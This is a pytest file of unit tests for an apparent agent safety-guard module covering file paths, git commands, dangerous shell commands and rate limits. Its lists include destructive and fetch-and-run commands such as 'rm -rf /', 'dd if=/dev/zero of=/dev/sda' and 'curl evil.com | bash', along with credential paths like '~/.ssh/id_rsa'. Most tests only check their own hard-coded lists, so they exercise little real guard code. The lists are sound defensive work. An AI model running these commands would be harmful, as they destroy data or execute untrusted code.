"""Unit tests for safety and guardrails modules."""

import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest


class TestFileGuard:
    """Test file guard safety checks."""

    def test_file_guard_safe_operations(self):
        """Test safe file operations."""
        # Test safe paths
        safe_paths = [
            "src/test.py",
            "tests/test_example.py",
            "./local_file.txt",
            "docs/readme.md"
        ]
        
        for path in safe_paths:
            assert not path.startswith("/etc")
            assert not path.startswith("/usr")
            assert not path.startswith("/sys")

    def test_file_guard_unsafe_operations(self):
        """Test unsafe file operations."""
        # Test unsafe paths
        unsafe_paths = [
            "/etc/passwd",
            "/usr/bin/python",
            "/sys/kernel",
            "~/.ssh/id_rsa"
        ]
        
        for path in unsafe_paths:
            assert any(danger in path for danger in ["/etc", "/usr", "/sys", "/.ssh"])

    def test_file_extension_validation(self):
        """Test file extension validation."""
        # Safe extensions
        safe_files = [
            "test.py",
            "config.json",
            "readme.md",
            "data.yaml",
            "style.css"
        ]
        
        for file in safe_files:
            ext = Path(file).suffix
            assert ext in ['.py', '.json', '.md', '.yaml', '.css']
        
        # Unsafe extensions
        unsafe_files = [
            "script.sh",
            "binary.exe",
            "archive.zip",
            "installer.deb"
        ]
        
        for file in unsafe_files:
            ext = Path(file).suffix
            assert ext in ['.sh', '.exe', '.zip', '.deb']


class TestGitGuard:
    """Test git operation safety."""

    def test_safe_git_commands(self):
        """Test safe git commands."""
        safe_commands = [
            ["git", "status"],
            ["git", "diff"],
            ["git", "log"],
            ["git", "branch"],
            ["git", "show"]
        ]
        
        for cmd in safe_commands:
            # These should not contain dangerous flags
            assert "-f" not in cmd
            assert "--force" not in cmd
            assert "--hard" not in cmd

    def test_unsafe_git_commands(self):
        """Test unsafe git commands."""
        unsafe_commands = [
            ["git", "push", "-f"],
            ["git", "reset", "--hard"],
            ["git", "clean", "-fdx"],
            ["git", "push", "--force"],
            ["git", "branch", "-D", "main"]
        ]
        
        for cmd in unsafe_commands:
            # These contain dangerous operations
            assert any(danger in cmd for danger in ["-f", "--force", "--hard", "-fdx", "-D"])

    def test_protected_branches(self):
        """Test protected branch names."""
        protected = ["main", "master", "production", "release", "prod"]
        unprotected = ["feature/test", "bugfix/issue-123", "dev/experimental"]
        
        for branch in protected:
            assert branch in ["main", "master", "production", "release", "prod"]
        
        for branch in unprotected:
            assert "/" in branch or branch not in protected


class TestOperationValidator:
    """Test operation validation."""

    def test_dangerous_commands(self):
        """Test detection of dangerous commands."""
        dangerous = [
            ["rm", "-rf", "/"],
            ["sudo", "rm", "-rf"],
            ["chmod", "777", "/etc"],
            ["chown", "root", "/"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["mkfs.ext4", "/dev/sda"],
            ["> /dev/sda"],
            ["curl", "evil.com", "|", "bash"]
        ]
        
        for cmd in dangerous:
            # Check for dangerous patterns
            dangerous_patterns = ["rm -rf /", "sudo", "chmod 777", "dd if=", "mkfs", "> /dev", "| bash"]
            cmd_str = " ".join(cmd)
            assert any(pattern in cmd_str for pattern in dangerous_patterns)

    def test_safe_commands(self):
        """Test safe command validation."""
        safe = [
            ["ls", "-la"],
            ["python", "test.py"],
            ["git", "status"],
            ["echo", "hello"],
            ["cat", "file.txt"],
            ["grep", "pattern", "file.txt"]
        ]
        
        for cmd in safe:
            # Should not contain dangerous patterns
            cmd_str = " ".join(cmd)
            assert "sudo" not in cmd_str
            assert "rm -rf /" not in cmd_str
            assert "chmod 777" not in cmd_str

    def test_path_validation(self):
        """Test path validation."""
        # System paths that should be protected
        system_paths = [
            "/etc/passwd",
            "/usr/bin/python",
            "/boot/grub",
            "/sys/kernel",
            "/proc/1"
        ]
        
        for path in system_paths:
            assert path.startswith(("/etc", "/usr", "/boot", "/sys", "/proc"))
        
        # User paths that are generally safe
        user_paths = [
            "./src/main.py",
            "tests/test.py",
            "/tmp/scratch.txt",
            "~/projects/app.py"
        ]
        
        for path in user_paths:
            assert not path.startswith(("/etc", "/usr/bin", "/boot", "/sys", "/proc"))


class TestRateLimiting:
    """Test rate limiting functionality."""

    def test_operation_counting(self):
        """Test operation counting."""
        max_ops = 10
        counter = 0
        
        for i in range(15):
            counter += 1
            if counter > max_ops:
                assert counter > max_ops
                break
        
        assert counter == 11

    def test_rate_limit_reset(self):
        """Test rate limit reset."""
        counter = 10
        counter = 0  # Reset
        assert counter == 0


class TestSafetyIntegration:
    """Test integration of safety modules."""

    def test_combined_validation(self):
        """Test combining multiple validations."""
        
        def is_safe_operation(op_type, path, command=None):
            """Combined safety check."""
            # Check path safety
            if path.startswith(("/etc", "/usr", "/sys")):
                return False
            
            # Check command safety if provided
            if command:
                cmd_str = " ".join(command) if isinstance(command, list) else command
                if any(danger in cmd_str for danger in ["sudo", "rm -rf /", "chmod 777"]):
                    return False
            
            # Check operation type
            if op_type in ["delete", "truncate"] and path.startswith("/"):
                return False
            
            return True
        
        # Test safe operations
        assert is_safe_operation("read", "test.py") is True
        assert is_safe_operation("write", "./output.txt") is True
        
        # Test unsafe operations
        assert is_safe_operation("delete", "/etc/passwd") is False
        assert is_safe_operation("write", "/usr/bin/python") is False
        assert is_safe_operation("execute", "test.sh", ["sudo", "rm", "-rf"]) is False

    def test_safety_with_temp_files(self):
        """Test safety with temporary files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            temp_file = os.path.join(tmpdir, "test.txt")
            
            # Operations on temp files should be safe
            assert not temp_file.startswith(("/etc", "/usr", "/sys"))
            assert "/tmp" in tmpdir or "Temp" in tmpdir  # Unix or Windows temp

    def test_file_size_limits(self):
        """Test file size limit checking."""
        max_size = 100 * 1024 * 1024  # 100MB
        
        sizes = [
            (50 * 1024 * 1024, True),   # 50MB - OK
            (100 * 1024 * 1024, True),  # 100MB - OK  
            (150 * 1024 * 1024, False), # 150MB - Too large
            (1024 * 1024 * 1024, False) # 1GB - Too large
        ]
        
        for size, should_pass in sizes:
            if should_pass:
                assert size <= max_size
            else:
                assert size > max_size